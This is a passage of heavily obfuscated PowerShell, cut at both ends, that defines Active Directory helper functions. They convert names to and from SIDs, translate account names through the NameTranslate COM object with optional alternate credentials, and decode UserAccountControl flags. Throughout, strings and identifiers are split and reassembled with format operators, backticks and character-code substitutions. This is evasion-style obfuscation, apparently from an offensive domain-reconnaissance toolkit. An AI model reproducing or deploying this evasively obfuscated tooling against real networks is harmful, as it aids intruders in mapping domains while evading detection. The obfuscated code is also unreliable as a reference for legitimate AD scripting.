                    ${u`sE`RNAME} = ${D`N}.("{0}{1}" -f 'S','plit').Invoke(',')[0].("{0}{1}"-f 'spli','t').Invoke('=')[1]

                    ${DOMaIn`S`E`ARcHe`RaRgUMENTS}[("{0}{1}" -f 'I','dentity')] = ${US`erN`AmE}
                    ${D`OmA`I`NSEarCHe`R`ArG`UmEn`TS}[("{0}{1}{2}"-f'D','omai','n')] = ${USE`R`D`OmAIN}
                    ${D`OMAiNsE`ARC`hErAR`Gu`MENtS}[("{2}{1}{0}"-f 'rties','ope','Pr')] = ("{1}{0}{2}"-f'tsi','objec','d')
                    &("{0}{2}{3}{1}"-f 'Get-Do','Object','mai','n') @DomainSearcherArguments | &("{0}{4}{1}{2}{3}"-f'S','ect-Obj','e','ct','el') -Expand ("{1}{0}{2}" -f'bjectsi','o','d')
                }
            }
            else {
                try {
                    if (${O`B`JECT}.("{1}{0}{2}" -f'tain','Con','s').Invoke('\')) {
                        ${doM`AIN} = ${Obj`Ect}.("{1}{0}"-f 't','Spli').Invoke('\')[0]
                        ${o`BJEcT} = ${o`Bj`Ect}.("{0}{1}" -f 'Sp','lit').Invoke('\')[1]
                    }
                    elseif (-not ${PSB`OuN`dpARAM`eTERs}[("{0}{1}{2}"-f'D','o','main')]) {
                        ${DOmAi`NseArC`hER`Ar`gu`MenTS} = @{}
                        ${DOma`In} = (&("{1}{0}{2}" -f 'Doma','Get-','in') @DomainSearcherArguments)."Na`ME"
                    }

                    ${O`BJ} = (&("{2}{1}{0}" -f'ct','w-Obje','Ne') ("{7}{5}{6}{8}{3}{9}{1}{4}{2}{0}"-f 'ount','inci','al.NTAcc','.','p','te','m','Sys','.Security','Pr')(${d`oMa`iN}, ${O`Bj`Ect}))
                    ${O`Bj}."TRa`NSLa`TE"([System.Security.Principal.SecurityIdentifier])."V`AlUe"
                }
                catch {
                    &("{2}{1}{0}"-f'rbose','ite-Ve','Wr') ('[Conv'+'ertTo'+'-SID] '+'Err'+'or'+' '+'co'+'nve'+'r'+'ting '+"$Domain\$Object "+': '+"$_")
                }
            }
        }
    }
}


function cOnvE`R`TfRo`m-`siD {


    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(MandAtOrY = ${t`RuE}, vaLUEfROMpipELInE = ${tr`Ue}, VaLUeFRoMpIpELINebYPROPertyNAme = ${tr`UE})]
        [Alias('SID')]
        [ValidatePattern({"{1}{0}"-f'.*','^S-1-'})]
        [String[]]
        ${obj`ecT`sid},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`ma`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}{3}" -f'o','D','mainCon','troller'})]
        [String]
        ${SE`RV`er},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRed`eNtI`AL} =  ( VAriAbLe  ("7T"+"q02")  )."v`ALuE"::"E`MPTY"
    )

    BEGIN {
        ${aDN`AME`AR`guMeNTS} = @{}
        if (${p`sBO`UNdP`ARAMEteRs}[("{0}{1}"-f'Do','main')]) { ${AD`NAM`Ea`RGuMENtS}[("{1}{0}"-f'ain','Dom')] = ${dOm`A`iN} }
        if (${psBoUn`D`pARamEt`ers}[("{1}{0}{2}"-f'e','Serv','r')]) { ${ADN`AMEa`RGUM`e`Nts}[("{1}{0}" -f 'r','Serve')] = ${SE`R`VeR} }
        if (${pSBOuND`p`Ar`AM`etERS}[("{2}{1}{0}"-f'al','enti','Cred')]) { ${AD`N`A`m`eARG`UMeNtS}[("{2}{1}{0}{3}"-f'nt','e','Cred','ial')] = ${C`RedENTi`Al} }
    }

    PROCESS {
        ForEach (${tAR`g`eTsiD} in ${o`BjEct`sid}) {
            ${T`A`RGEtsId} = ${tArg`e`TS`id}.("{0}{1}" -f't','rim').Invoke('*')
            try {
                
                Switch (${taR`Ge`T`sID}) {
                    ("{0}{1}" -f'S','-1-0')         { ("{2}{3}{0}{1}{4}"-f 'A','uthori','Nu','ll ','ty') }
                    ("{1}{0}{2}"-f'-0-','S-1','0')       { ("{0}{2}{1}" -f 'No','ody','b') }
                    ("{0}{1}"-f 'S-','1-1')         { ("{1}{2}{3}{0}"-f'rity','W','orld Au','tho') }
                    ("{0}{2}{1}"-f 'S-','1-0','1-')       { ("{1}{0}{2}" -f'r','Eve','yone') }
                    ("{1}{0}" -f'-2','S-1')         { ("{1}{2}{0}{3}" -f'rit','Local',' Autho','y') }
                    ("{0}{1}" -f'S','-1-2-0')       { ("{1}{0}"-f'al','Loc') }
                    ("{1}{0}"-f'-1','S-1-2')       { ("{0}{2}{1}{3}"-f'Console ','og','L','on ') }
                    ("{1}{0}" -f'-3','S-1')         { ("{2}{4}{3}{0}{1}" -f'Au','thority','Cre','tor ','a') }
                    ("{1}{0}{2}" -f '1-','S-','3-0')       { ("{1}{2}{3}{0}"-f'r','Creato','r',' Owne') }
                    ("{1}{0}{2}"-f '1-3-','S-','1')       { ("{2}{0}{1}"-f 'eat','or Group','Cr') }
                    ("{1}{0}"-f '3-2','S-1-')       { ("{5}{2}{0}{4}{1}{6}{3}" -f'ator','w','e','erver',' O','Cr','ner S') }
                    ("{2}{1}{0}" -f'-3','1-3','S-')       { ("{1}{0}{4}{3}{2}"-f 'ato','Cre','er',' Serv','r Group') }
                    ("{1}{2}{0}"-f '-4','S-1','-3')       { ("{2}{0}{1}{3}"-f 'wne','r Ri','O','ghts') }
                    ("{1}{0}"-f '4','S-1-')         { ("{5}{3}{0}{6}{4}{2}{1}"-f'-u','y','it','on','thor','N','nique Au') }
                    ("{0}{1}" -f'S','-1-5')         { ("{1}{2}{0}"-f'ty','NT ','Authori') }
                    ("{2}{0}{1}"-f '5-','1','S-1-')       { ("{1}{0}" -f'alup','Di') }
                    ("{0}{1}{2}" -f'S-1-','5','-2')       { ("{0}{1}"-f'Netw','ork') }
                    ("{0}{1}" -f 'S-1-5','-3')       { ("{1}{0}"-f'ch','Bat') }
                    ("{0}{1}"-f 'S-1-','5-4')       { ("{3}{1}{0}{2}"-f 'iv','t','e','Interac') }
                    ("{1}{0}{2}" -f'1-','S-','5-6')       { ("{0}{1}"-f 'Se','rvice') }
                    ("{0}{1}{2}"-f'S','-1-','5-7')       { ("{1}{0}{2}"-f'o','Anonym','us') }
                    ("{1}{0}" -f'-1-5-8','S')       { ("{1}{0}"-f 'y','Prox') }
                    ("{1}{2}{0}"-f'9','S-1-','5-')       { ("{5}{2}{0}{4}{1}{3}{6}" -f 'r','Domain Con','erp','troller','ise ','Ent','s') }
                    ("{1}{0}{2}"-f'-5','S-1','-10')      { ("{1}{2}{0}" -f'f','P','rincipal Sel') }
                    ("{0}{1}" -f'S-1-5-1','1')      { ("{0}{5}{4}{1}{2}{3}" -f'Authent','a','ted',' Users','c','i') }
                    ("{1}{0}" -f '5-12','S-1-')      { ("{2}{0}{3}{1}{4}"-f 'trict',' Co','Res','ed','de') }
                    ("{2}{1}{0}" -f'3','-5-1','S-1')      { ("{1}{5}{4}{2}{3}{0}" -f 'ers','Termina','U','s','Server ','l ') }
                    ("{2}{1}{0}" -f '4','5-1','S-1-')      { ("{6}{4}{0}{2}{1}{3}{5}" -f'ntera','i','ct','ve ','ote I','Logon','Rem') }
                    ("{1}{0}" -f '-1-5-15','S')      { ("{0}{1}{3}{2}" -f'Th','is Or','n ','ganizatio') }
                    ("{2}{1}{0}" -f '-5-17','-1','S')      { ("{1}{3}{4}{0}{2}{5}" -f 'niz','Thi','atio','s Org','a','n ') }
                    ("{2}{1}{0}" -f '18','1-5-','S-')      { ("{1}{0}{3}{2}"-f'c','Lo','m','al Syste') }
                    ("{0}{1}{2}" -f 'S','-1-','5-19')      { ("{2}{3}{1}{0}"-f 'ty','Authori','N','T ') }
                    ("{1}{2}{0}"-f '20','S-1-5','-')      { ("{0}{2}{1}"-f 'NT Au','ty','thori') }
                    ("{3}{2}{1}{0}"-f '0-0','-8','5','S-1-')    { ("{1}{0}{2}"-f'ces','All Servi',' ') }
                    ("{0}{1}{2}" -f'S-1-5-','3','2-544')  { ((("{0}{1}{3}{4}{2}" -f'BUI','LTI','strators','NkhWAdmin','i'))-cREPlacE'khW',[cHar]92) }
                    ("{0}{2}{3}{1}"-f'S-1','545','-5-','32-')  { ((("{0}{3}{1}{2}" -f 'BUI','Us','ers','LTINGkS')).("{0}{2}{1}"-f 'r','CE','epLa').Invoke('GkS','\')) }
                    ("{1}{2}{0}" -f '2-546','S-1-5-','3')  { ((("{4}{5}{2}{1}{3}{0}" -f 's','s','LTINg6tGue','t','BU','I'))."rep`lA`cE"('g6t',[stRinG][CHar]92)) }
                    ("{2}{0}{1}"-f'5-32-','547','S-1-')  { ((("{0}{6}{1}{3}{5}{2}{4}" -f 'B','gPo','er','wer U','s','s','UILTINw7')) -RePLaCe ([cHAr]119+[cHAr]55+[cHAr]103),[cHAr]92) }
                    ("{1}{2}{0}" -f'48','S-1-5-3','2-5')  { ((("{3}{2}{1}{5}{6}{0}{4}" -f'O','TIN3','IL','BU','perators','aPAccount',' '))."Re`P`LACE"('3aP',[String][chAR]92)) }
                    ("{0}{3}{2}{1}" -f'S-1','32-549','5-','-')  { ((("{2}{0}{5}{3}{4}{6}{7}{1}"-f'UILTI','ors','B','{','0}Serv','N','er Op','erat'))  -f [char]92) }
                    ("{2}{0}{1}" -f '5','50','S-1-5-32-')  { ((("{0}{3}{1}{2}{4}"-f'BUI','{0}Print Opera','tor','LTIN','s'))  -f  [cHar]92) }
                    ("{3}{1}{2}{0}" -f'51','-5','-32-5','S-1')  { ((("{4}{5}{2}{7}{6}{1}{0}{3}"-f'a','r','}Ba','tors','B','UILTIN{0','Ope','ckup '))  -F[char]92) }
                    ("{1}{0}{2}{3}" -f'-1-','S','5-32-55','2')  { ((("{3}{1}{0}{2}{4}" -f'IND3dReplicat','T','o','BUIL','rs'))-CrePlACE([CHAr]68+[CHAr]51+[CHAr]100),[CHAr]92) }
                    ("{3}{0}{2}{1}"-f'5','2-554','-3','S-1-')  { ((("{1}{7}{5}{0}{6}{3}{2}{4}" -f '0','BU','Comp',' ','atible Access','{0}Pre-Windows 2','00','ILTIN')) -f [cHaR]92) }
                    ("{1}{2}{0}"-f '5','S-1-5-3','2-55')  { ((("{7}{3}{6}{4}{0}{5}{1}{2}" -f'ot','k','top Users','LTIN70p','em','e Des','R','BUI'))."R`EP`LAce"(([ChaR]55+[ChaR]48+[ChaR]112),[striNg][ChaR]92)) }
                    ("{2}{1}{0}" -f '6','5-32-55','S-1-')  { ((("{2}{3}{0}{1}{4}"-f 'iguration',' Ope','BUILTIN','NI5Network Conf','rators')) -crEPlaCe 'NI5',[chAR]92) }
                    ("{0}{2}{1}"-f 'S-1-','2-557','5-3')  { ((("{2}{3}{9}{11}{7}{4}{6}{0}{10}{8}{5}{1}" -f 'in','ers','BUIL','TI','o',' Build','m','c','orest Trust','NU48I','g F','n'))-CrePlacE'U48',[CHAR]92) }
                    ("{1}{0}{3}{2}" -f'-1-5-3','S','58','2-5')  { ((("{1}{3}{2}{5}{7}{6}{0}{8}{4}"-f'nce Monit','BUILTINcu7P','rf','e','s','o','a','rm','or User'))."REp`lacE"(([cHaR]99+[cHaR]117+[cHaR]55),'\')) }
                    ("{2}{1}{0}" -f '559','-5-32-','S-1')  { ((("{7}{6}{2}{0}{4}{8}{1}{5}{3}"-f '{','an','IN','ers','0}Perfo','ce Log Us','ILT','BU','rm'))-f[ChAr]92) }
                    ("{0}{1}{2}{3}" -f 'S-','1','-5-32-','560')  { ((("{8}{2}{4}{9}{7}{3}{12}{5}{6}{10}{1}{11}{0}"-f 'roup','zation Acc','U','ows A','ILTINgQr','t','hor','nd','B','Wi','i','ess G','u'))-CrEpLACe 'gQr',[cHAr]92) }
                    ("{0}{3}{2}{1}" -f 'S-1','-561','-32','-5')  { ((("{0}{4}{3}{2}{1}{6}{5}"-f 'BU','a','RoNTermin','IN','ILT','erver License Servers','l S'))-CrePLaCe  'RoN',[cHaR]92) }
                    ("{2}{0}{1}" -f'-5-32-56','2','S-1')  { ((("{6}{5}{0}{3}{2}{1}{4}"-f'ILTINE','U','ributed COM ','B2Dist','sers','U','B')) -cRePLACe ([CHAR]69+[CHAR]66+[CHAR]50),[CHAR]92) }
                    ("{3}{0}{1}{2}" -f '1-5','-32-','569','S-')  { ((("{8}{7}{0}{6}{1}{9}{3}{2}{4}{5}" -f 'LT','N{0}','a','yptogr','phic Ope','rators','I','UI','B','Cr'))  -F [cHAr]92) }
                    ("{3}{1}{2}{0}"-f'573','-3','2-','S-1-5')  { ((("{1}{5}{3}{7}{4}{2}{6}{0}"-f's','BU','t ','Ev','n','ILTIN{0}','Log Reader','e'))  -F [CHAr]92) }
                    ("{1}{0}{2}"-f'1-5-3','S-','2-574')  { ((("{2}{6}{1}{3}{5}{0}{4}" -f'COM Acces','ficat','BUILTIN{0}Cert','e Serv','s','ice D','i'))-F  [CHAr]92) }
                    ("{2}{1}{3}{0}" -f '575','-1-5-','S','32-')  { ((("{6}{2}{0}{8}{7}{4}{9}{5}{3}{1}"-f 'q4RD','s','LTINP','er','Acc','ss Serv','BUI',' Remote ','S','e'))."Re`P`laCe"(([CHAr]80+[CHAr]113+[CHAr]52),[StriNG][CHAr]92)) }
                    ("{0}{1}{2}"-f 'S-1-','5-3','2-576')  { ((("{4}{1}{0}{2}{5}{3}"-f'DS Endpoint ','UILTIN6LkR','Ser','ers','B','v'))  -crePlace'6Lk',[char]92) }
                    ("{3}{0}{2}{1}" -f'-1-5-3','577','2-','S')  { ((("{3}{5}{4}{0}{2}{1}"-f'e','ervers','ment S','BUILTI','DRDS Manag','NCP')).("{1}{0}{2}"-f'l','Rep','ace').Invoke('CPD','\')) }
                    ("{2}{1}{0}{3}"-f'-3','5','S-1-','2-578')  { ((("{1}{0}{7}{6}{9}{10}{5}{8}{2}{4}{3}"-f'UILTINn','B','i','ors','strat','-V Ad','P','W','min','H','yper'))  -REPLAce  ([Char]110+[Char]87+[Char]80),[Char]92) }
                    ("{1}{3}{2}{0}" -f '579','S-1-','2-','5-3')  { ((("{3}{4}{1}{2}{0}{6}{5}"-f 'Access ','LTI','NgaY','B','UI','tance Operators','Control Assis'))  -rEpLAcE([cHAr]103+[cHAr]97+[cHAr]89),[cHAr]92) }
                    ("{3}{1}{2}{0}"-f '0','1-','5-32-58','S-')  { ((("{1}{3}{0}{7}{2}{4}{8}{5}{6}"-f'0}Acc','BUI','Cont','LTIN{','rol A','e Operato','rs','ess ','ssistanc'))  -f[CHAR]92) }
                    Default {
                        &("{0}{1}{3}{2}"-f 'Convert','-ADN','me','a') -Identity ${tAr`GEt`siD} @ADNameArguments
                    }
                }
            }
            catch {
                &("{2}{1}{0}" -f'erbose','V','Write-') ('[Conve'+'rt'+'F'+'ro'+'m-SI'+'D] '+'Er'+'ror '+'converti'+'n'+'g '+'SI'+'D '+"'$TargetSid' "+': '+"$_")
            }
        }
    }
}


function CO`N`VerT-ADnA`me {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{11}{6}{10}{0}{8}{9}{5}{3}{7}{1}{4}" -f'e','n','PSU','or','gFunctions','F','eShouldPr','StateChangi','s','s','oc','s'}, '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(MandatORY = ${T`Rue}, vALuEfRomPIpELiNe = ${tr`Ue}, valUEFromPiPeliNEByPROpErtynAMe = ${tr`UE})]
        [Alias({"{0}{1}"-f 'N','ame'}, {"{0}{1}{2}" -f'Obj','ectNa','me'})]
        [String[]]
        ${I`DEnt`iTy},

        [String]
        [ValidateSet('DN', {"{1}{0}{2}"-f 'a','Canonic','l'}, 'NT4', {"{1}{2}{0}" -f 'ay','Disp','l'}, {"{1}{0}{3}{2}"-f 'mainS','Do','ple','im'}, {"{3}{0}{1}{2}"-f 'nter','pris','eSimple','E'}, {"{0}{1}"-f 'GU','ID'}, {"{2}{0}{1}"-f'no','wn','Unk'}, 'UPN', {"{2}{3}{1}{0}" -f 'Ex','nonical','C','a'}, 'SPN')]
        ${oUT`PUT`TY`pE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Doma`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}{3}{4}"-f 'Doma','i','nC','ontrolle','r'})]
        [String]
        ${Se`Rver},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`EdENT`iAL} =  ${7`Tq02}::"E`MpTy"
    )

    BEGIN {
        ${NaM`ET`YPeS} = @{
            'DN'                =   1  
            ("{2}{0}{1}"-f'nonica','l','Ca')         =   2  
            'NT4'               =   3  
            ("{1}{0}"-f'isplay','D')           =   4  
            ("{3}{0}{2}{1}" -f 'ainS','mple','i','Dom')      =   5  
            ("{4}{1}{3}{0}{2}"-f'pl','nterpr','e','iseSim','E')  =   6  
            ("{1}{0}"-f 'UID','G')              =   7  
            ("{0}{1}{2}"-f 'Unkno','w','n')           =   8  
            'UPN'               =   9  
            ("{3}{1}{2}{0}" -f 'lEx','onic','a','Can')       =   10 
            'SPN'               =   11 
            'SID'               =   12 
        }

        
        function inVOk`e-`m`EtHod([__ComObject] ${OB`jeCT}, [String] ${m`etHoD}, ${Pa`R`AM`etERS}) {
            ${o`U`TPuT} = ${n`UlL}
            ${OU`Tp`Ut} = ${obJ`ecT}.("{0}{2}{1}" -f'G','tType','e').Invoke().("{1}{0}{2}" -f 'be','InvokeMem','r').Invoke(${M`EtHOd}, ("{1}{0}{2}"-f'etho','InvokeM','d'), ${Nu`Ll}, ${o`BjE`cT}, ${p`AR`AMetERs})
            &("{0}{1}{2}{3}" -f'W','rit','e-','Output') ${oUt`PUT}
        }

        function geT-pro`p`ErTy([__ComObject] ${o`Bject}, [String] ${pR`o`peR`Ty}) {
            ${Ob`JE`ct}.("{0}{2}{1}"-f'G','ype','etT').Invoke().("{0}{2}{1}" -f'InvokeM','er','emb').Invoke(${pROPE`R`Ty}, ("{0}{1}{3}{2}"-f'Ge','tPr','rty','ope'), ${nu`ll}, ${Obj`E`cT}, ${nu`LL})
        }

        function sET-`Pro`PerTY([__ComObject] ${obJ`e`CT}, [String] ${pR`o`pERty}, ${p`ArAM`e`Ters}) {
            [Void] ${OBJE`Ct}.("{0}{1}" -f'Ge','tType').Invoke().("{2}{1}{0}"-f'mber','nvokeMe','I').Invoke(${PR`ope`RtY}, ("{2}{3}{1}{0}" -f'ty','r','SetP','rope'), ${Nu`LL}, ${oB`JEct}, ${pa`RAmeT`ers})
        }

        
        if (${PsbouN`d`Pa`R`AMeTERs}[("{1}{0}" -f'erver','S')]) {
            ${adS`In`I`TtyPe} = 2
            ${In`itN`AME} = ${sErv`ER}
        }
        elseif (${psBOU`N`Dparam`ETeRs}[("{1}{0}"-f'n','Domai')]) {
            ${Ad`S`initType} = 1
            ${INIt`Na`mE} = ${d`om`AIn}
        }
        elseif (${Psbo`UN`dparAM`E`TErS}[("{0}{2}{1}"-f'Cred','ntial','e')]) {
            ${cR`eD} = ${CREdent`I`AL}.("{0}{2}{1}{3}{4}{5}"-f'Ge','wo','tNet','rkCr','e','dential').Invoke()
            ${Adsi`NItt`y`pe} = 1
            ${IN`it`NaME} = ${CR`ED}."DO`mAIN"
        }
        else {
            
            ${AdsI`N`I`TtYPe} = 3
            ${ini`T`NAMe} = ${nU`LL}
        }
    }

    PROCESS {
        ForEach (${TArGEt`iD`en`T`ITY} in ${id`EN`TiTY}) {
            if (-not ${pS`B`O`U`NDpArameteRS}[("{2}{1}{0}" -f 'ype','utputT','O')]) {
                if (${TaRg`e`TIDEN`TitY} -match ((("{5}{3}{4}{1}{7}{6}{2}{0}" -f'z ]+',']+{0}','Za-','Za','-z','^[A-','[A-','{0}')) -F  [chAr]92)) {
                    ${a`dsOut`Put`T`ype} = ${NA`m`Et`yPes}[("{0}{2}{1}"-f'DomainSi','le','mp')]
                }
                else {
                    ${a`ds`oUtPUTtYPE} = ${nAmE`T`yPEs}['NT4']
                }
            }
            else {
                ${AD`sOuTpuTt`YpE} = ${NA`ME`TY`pES}[${OUTPUt`T`ype}]
            }

            ${T`RaNS`laTE} = &("{0}{2}{1}"-f 'New','bject','-O') -ComObject ("{1}{3}{0}{4}{2}" -f'rans','Name','te','T','la')

            if (${pS`B`OunD`P`ArAMEters}[("{1}{2}{3}{0}" -f'ial','Cr','eden','t')]) {
                try {
                    ${C`Red} = ${c`Rede`NTIaL}.("{1}{0}{4}{3}{2}"-f'Net','Get','dential','rkCre','wo').Invoke()

                    &("{3}{2}{0}{1}"-f'Metho','d','oke-','Inv') ${Trans`L`A`TE} ("{1}{0}{2}" -f 'itE','In','x') (
                        ${adSiN`iT`TYPE},
                        ${iniTN`Ame},
                        ${c`Red}."U`SER`NAMe",
                        ${CR`ED}."dom`AIn",
                        ${cR`eD}."PasSw`o`RD"
                    )
                }
                catch {
                    &("{1}{2}{0}"-f 'bose','Write','-Ver') ('[Conv'+'e'+'rt'+'-ADName] '+'Er'+'ror '+'initi'+'alizing'+' '+'tran'+'slat'+'ion '+'f'+'or '+"'$Identity' "+'u'+'sing '+'alte'+'rna'+'te '+'crede'+'ntial'+'s'+' '+': '+"$_")
                }
            }
            else {
                try {
                    ${N`ULl} = &("{2}{0}{1}{3}" -f 'n','voke-Met','I','hod') ${tRAnsL`A`Te} ("{1}{0}"-f 'it','In') (
                        ${aDS`in`iTtyPe},
                        ${ini`T`NaME}
                    )
                }
                catch {
                    &("{1}{2}{0}"-f 'erbose','Writ','e-V') ('[Con'+'vert-A'+'D'+'Nam'+'e] '+'Err'+'or '+'in'+'i'+'tializing '+'tra'+'n'+'slation'+' '+'f'+'or '+"'$Identity' "+': '+"$_")
                }
            }

            
            &("{0}{2}{3}{1}" -f 'S','perty','et-P','ro') ${tR`A`NSLate} ("{1}{0}{3}{2}"-f'e','ChaseR','al','ferr') (0x60)

            try {
                
                ${nU`lL} = &("{2}{0}{3}{1}" -f 'e','od','Invok','-Meth') ${tRansl`A`Te} 'Set' (8, ${ta`Rgeti`DeNt`Ity})
                &("{1}{0}{2}" -f'e-Me','Invok','thod') ${t`Ra`N`slATE} 'Get' (${A`dSo`U`TPutTy`Pe})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                &("{2}{1}{3}{0}" -f 'bose','r','W','ite-Ver') "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message) "
            }
        }
    }
}


function c`OnvE`R`TfRO`m-uacvAL`Ue {


    [OutputType({"{6}{4}{3}{7}{8}{5}{2}{0}{1}"-f 'd.Orde','redDictionary','cialize','tem','ys','ns.Spe','S','.Coll','ectio'})]
    [CmdletBinding()]
    Param(
        [Parameter(mANDATory = ${TR`UE}, VAlUEFrOMPIpEline = ${t`RuE}, vAlUEfroMpIPeLINEbYProPeRTYnAme = ${T`RuE})]
        [Alias('UAC', {"{4}{0}{5}{1}{2}{3}" -f 'rac','oun','tc','ontrol','use','c'})]
        [Int]
        ${v`AL`Ue},

        [Switch]
        ${ShOWA`ll}
    )

    BEGIN {
        
        ${U`Acv`ALuES} = &("{0}{3}{1}{2}"-f'N','w-Ob','ject','e') ("{5}{4}{2}{1}{6}{3}{0}{7}"-f'iction','d','m.Collections.Specialized.Or','dD','e','Syst','ere','ary')
        ${UaC`V`Alu`ES}.("{1}{0}"-f'd','Ad').Invoke(("{1}{0}"-f'IPT','SCR'), 1)
        ${Ua`cVAlu`es}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{3}{0}{4}{2}"-f'OU','AC','DISABLE','C','NT'), 2)
        ${uaC`V`AlUeS}.("{0}{1}"-f'A','dd').Invoke(("{0}{3}{1}{2}{4}" -f 'HOMEDI','RE','QU','R_','IRED'), 8)
        ${uAcVaL`U`es}.("{1}{0}"-f'dd','A').Invoke(("{1}{0}"-f 'T','LOCKOU'), 16)
        ${UAC`Val`Ues}.("{0}{1}"-f 'Ad','d').Invoke(("{3}{0}{1}{4}{2}"-f 'N','O','D','PASSWD_','TREQ'), 32)
        ${uACV`A`LU`eS}.("{1}{0}" -f 'dd','A').Invoke(("{2}{0}{1}{3}"-f'WD_C','ANT_','PASS','CHANGE'), 64)
        ${U`Ac`VAl`UEs}.("{1}{0}"-f 'd','Ad').Invoke(("{7}{3}{6}{4}{0}{2}{8}{1}{5}"-f 'TED_','WE','TEX','C','P','D','RY','EN','T_PWD_ALLO'), 128)
        ${u`A`cVaLueS}.("{1}{0}" -f 'd','Ad').Invoke(("{6}{4}{2}{0}{3}{5}{1}"-f 'C','NT','_DUPLI','ATE_ACCO','EMP','U','T'), 256)
        ${uA`Cv`AluES}.("{1}{0}" -f'dd','A').Invoke(("{3}{1}{2}{0}"-f 'NT','_AC','COU','NORMAL'), 512)
        ${UAC`VALu`es}.("{1}{0}" -f 'dd','A').Invoke(("{3}{2}{0}{4}{1}"-f'D','ST_ACCOUNT','R','INTE','OMAIN_TRU'), 2048)
        ${Ua`cV`ALUes}.("{1}{0}"-f 'd','Ad').Invoke(("{6}{3}{4}{5}{1}{2}{0}" -f'COUNT','U','ST_AC','ATIO','N_T','R','WORKST'), 4096)
        ${UA`C`VALuES}.("{1}{0}" -f'd','Ad').Invoke(("{5}{4}{0}{2}{3}{6}{1}"-f'_','COUNT','TRUS','T_A','VER','SER','C'), 8192)
        ${Ua`CVAL`U`Es}.("{1}{0}" -f 'd','Ad').Invoke(("{5}{2}{3}{1}{0}{4}"-f 'A','P','_EXPIR','E_','SSWORD','DONT'), 65536)
        ${uAcvA`l`UEs}.("{0}{1}" -f 'Ad','d').Invoke(("{1}{3}{4}{0}{2}" -f'ON_AC','M','COUNT','NS_L','OG'), 131072)
        ${ua`C`VAL`UEs}.("{0}{1}" -f 'A','dd').Invoke(("{2}{4}{3}{0}{1}" -f 'ARD_REQUIRE','D','SMA','C','RT'), 262144)
        ${Uac`V`AlUEs}.("{1}{0}" -f'd','Ad').Invoke(("{4}{0}{2}{3}{1}" -f'FOR_DEL','N','E','GATIO','TRUSTED_'), 524288)
        ${uaC`V`ALu`eS}.("{1}{0}"-f'd','Ad').Invoke(("{1}{0}{2}"-f 'OT_','N','DELEGATED'), 1048576)
        ${UAcV`Al`UeS}.("{0}{1}" -f'Ad','d').Invoke(("{0}{2}{1}{3}"-f 'USE_','_','DES','KEY_ONLY'), 2097152)
        ${ua`cvA`Lues}.("{1}{0}"-f'dd','A').Invoke(("{2}{1}{3}{0}"-f'H','T_REQ_PR','DON','EAUT'), 4194304)
        ${u`A`cVALU`eS}.("{1}{0}"-f'dd','A').Invoke(("{1}{2}{4}{3}{0}" -f 'ED','PAS','SWOR','IR','D_EXP'), 8388608)
        ${u`A`cV`AlUES}.("{1}{0}"-f'dd','A').Invoke(("{5}{2}{4}{1}{0}{3}" -f 'DELEGATIO','_FOR_','ED_','N','TO_AUTH','TRUST'), 16777216)
        ${U`AcValU`Es}.("{1}{0}"-f'd','Ad').Invoke(("{1}{5}{0}{4}{3}{2}" -f 'L_SECRETS','P','COUNT','C','_A','ARTIA'), 67108864)
    }

    PROCESS {
        ${resULT`UacV`A`lUEs} = &("{1}{0}{2}"-f '-Obje','New','ct') ("{4}{0}{5}{3}{8}{7}{1}{2}{6}" -f 'ns','ti','onar','S','System.Collectio','.','y','ed.OrderedDic','pecializ')

        if (${sh`OwA`lL}) {
            ForEach (${U`Ac`VAlUe} in ${uAC`Val`Ues}.("{3}{2}{1}{0}"-f 'rator','me','Enu','Get').Invoke()) {
                if ( (${v`A`lUe} -band ${uAcv`A`Lue}."v`ALUE") -eq ${uACv`Al`Ue}."V`AluE") {
                    ${rE`s`Ult`U`AcVaLuES}.("{1}{0}"-f 'dd','A').Invoke(${UacvA`LuE}."N`AME", "$($UACValue.Value)+")
                }
                else {
                    ${re`s`UlTu`ACVALues}.("{1}{0}" -f 'd','Ad').Invoke(${U`AC`VA`LUe}."nA`ME", "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach (${uA`c`VaLUE} in ${uA`cva`LUES}.("{0}{1}{2}"-f'Get','Enumerato','r').Invoke()) {
                if ( (${VAl`Ue} -band ${U`Ac`ValUe}."V`AluE") -eq ${U`Ac`Value}."vAL`Ue") {
                    ${r`e`s`UltUaCvALuES}.("{0}{1}"-f'Ad','d').Invoke(${uAc`VAL`UE}."n`AmE", "$($UACValue.Value)")
                }
            }
        }
        ${R`ESUlTU`AC`ValUeS}
    }
}


function G`E`T-pRINCipAlcO`NT`eXt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{1}{2}{3}"-f'PS','hou','ldProc','ess','S'}, '')]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItioN = 0, mANDaTOrY = ${Tr`UE})]
        [Alias({"{2}{0}{1}" -f'oup','Name','Gr'}, {"{1}{2}{0}{3}{4}"-f'upId','Gr','o','ent','ity'})]
        [String]
        ${I`DE`NtiTy},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`main},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`ED`eNtIaL} =  ${7t`q02}::"eM`ptY"
    )

    &("{2}{1}{0}" -f'e','Typ','Add-') -AssemblyName ("{4}{7}{1}{5}{2}{8}{0}{3}{6}"-f'coun','ec','s.A','tManageme','Syst','toryService','nt','em.Dir','c')

    try {
        if (${psboUNdp`ARam`etE`RS}[("{0}{1}" -f'Do','main')] -or (${id`eNtITY} -match ((("{1}{0}{2}{3}" -f'+{0','.','}{0}.','+'))  -F[CHaR]92))) {
            if (${IDEnT`i`Ty} -match ((("{0}{1}{2}" -f'.+LO','vLOv.','+'))."R`EP`lACE"('LOv',[sTRinG][ChAr]92))) {
                
